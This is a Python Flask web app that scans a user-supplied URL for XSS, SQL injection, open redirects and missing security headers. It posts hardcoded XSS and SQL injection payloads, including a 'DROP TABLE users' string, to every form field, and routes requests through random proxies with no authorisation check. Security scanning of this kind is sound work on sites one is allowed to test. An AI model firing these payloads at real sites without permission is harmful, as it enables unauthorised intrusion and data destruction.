from flask import Flask, request, render_template
import requests
from bs4 import BeautifulSoup
import urllib.parse
import random
import time
import os

app = Flask(__name__)

# ----------------- PROXY HANDLING -----------------
PROXY_FILE = "working_proxies.txt"  # store proxies in this file, one per line

def load_proxies():
    """Load proxies from file"""
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, "r") as f:
        return [line.strip() for line in f if line.strip()]

def get_random_proxy():
    """Pick a random proxy in requests format"""
    proxies = load_proxies()
    if not proxies:
        return None
    proxy = random.choice(proxies)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

# ----------------- DYNAMIC PAYLOADS -----------------
XSS_BASE = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>'
]
SQLI_BASE = [
    "'", '"', "' OR '1'='1", '" OR "1"="1',
    "admin'--", "'; DROP TABLE users;--"
]
REDIRECT_BASE = ['https://example.com', 'https://test.com']

def generate_payloads(input_type):
    payloads = []
    if input_type in ['text', 'search', 'email']:
        payloads.extend(XSS_BASE)
        payloads.extend(SQLI_BASE)
    elif input_type == 'password':
        payloads.extend(SQLI_BASE)
    return payloads

# ----------------- FLASK ROUTES -----------------
@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")

@app.route("/scan", methods=["POST"])
def scan():
    url = request.form["url"].strip()
    report = f"🔥 GIGA SCAN STARTED for: {url} 🔥\n\n"

    try:
        # ----------------- TRY PROXY WITH RETRY -----------------
        for attempt in range(5):
            proxy = get_random_proxy()
            try:
                if proxy:
                    response = requests.get(url, timeout=10, proxies=proxy)
                    report += f"Site reachable ✅ Status: {response.status_code}\nUsing proxy: {proxy['http']}\n\n"
                else:
                    response = requests.get(url, timeout=10)
                    report += f"Site reachable ✅ Status: {response.status_code}\n(No proxy used)\n\n"
                break
            except Exception as e:
                if proxy:
                    report += f"Proxy {proxy['http']} failed: {str(e)}\n"
                else:
                    report += f"Direct request failed: {str(e)}\n"
                time.sleep(1)
        else:
            return render_template("index.html", result="❌ All proxies failed. Try again later.")

        soup = BeautifulSoup(response.text, "html.parser")

        # --------- FORM INTELLIGENCE ----------
        forms = soup.find_all("form")
        report += f"Detected {len(forms)} form(s)\n"
        for i, form in enumerate(forms, 1):
            action = form.get("action") or ""
            report += f"\nForm {i} action: {action}\n"
            inputs = form.find_all("input")
            for inp in inputs:
                name = inp.get("name", "N/A")
                typ = inp.get("type", "text")
                report += f" Input: {name} ({typ})\n"

                payloads = generate_payloads(typ)
                for payload in payloads:
                    target = urllib.parse.urljoin(url, action)
                    for retry in range(3):  # Retry per payload
                        proxy = get_random_proxy()
                        try:
                            if proxy:
                                r = requests.post(target, data={name: payload}, timeout=10, proxies=proxy)
                            else:
                                r = requests.post(target, data={name: payload}, timeout=10)

                            if payload in r.text:
                                report += f" ⚠️ XSS detected in field '{name}' with payload {payload}\n"
                            elif any(err in r.text.lower() for err in ["sql syntax", "mysql", "syntax error", "unknown column"]):
                                report += f" ⚠️ SQL Injection possible in field '{name}' with payload {payload}\n"
                            break
                        except:
                            continue

        # --------- OPEN REDIRECT INTELLIGENCE ----------
        links = soup.find_all("a", href=True)
        redirects_found = []
        for link in links:
            href = link['href']
            if any(p in href.lower() for p in ["redirect=", "next=", "url="]):
                for payload in REDIRECT_BASE:
                    parsed = urllib.parse.urlparse(href)
                    query = urllib.parse.parse_qs(parsed.query)
                    for param in query:
                        query[param] = payload
                    new_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query, doseq=True)))
                    for retry in range(3):
                        proxy = get_random_proxy()
                        try:
                            if proxy:
                                r = requests.get(new_url, timeout=10, allow_redirects=False, proxies=proxy)
                            else:
                                r = requests.get(new_url, timeout=10, allow_redirects=False)
                            if r.status_code in [301, 302] and payload in r.headers.get("Location", ""):
                                redirects_found.append(new_url)
                            break
                        except:
                            continue
        report += f"\nOpen Redirects detected: {len(redirects_found)}\n"
        for rd in redirects_found:
            report += f" ⚠️ {rd}\n"

        # --------- HTTP SECURITY HEADERS ----------
        report += "\nHTTP Security Headers:\n"
        headers_to_check = [
            "Content-Security-Policy",
            "X-Frame-Options",
            "Strict-Transport-Security",
            "X-Content-Type-Options"
        ]
        for header in headers_to_check:
            if header in response.headers:
                report += f"  {header}: {response.headers[header]} ✅\n"
            else:
                report += f"  {header}: Not Set ⚠️\n"

        report += "\n🚀 SCAN COMPLETE: GIGA LEVEL REPORT GENERATED 🚀\n"

    except Exception as e:
        report += f"Scan failed: {str(e)}"

    return render_template("index.html", result=report)

# ----------------- RUN FLASK -----------------
if __name__ == "__main__":
    app.run(debug=True)
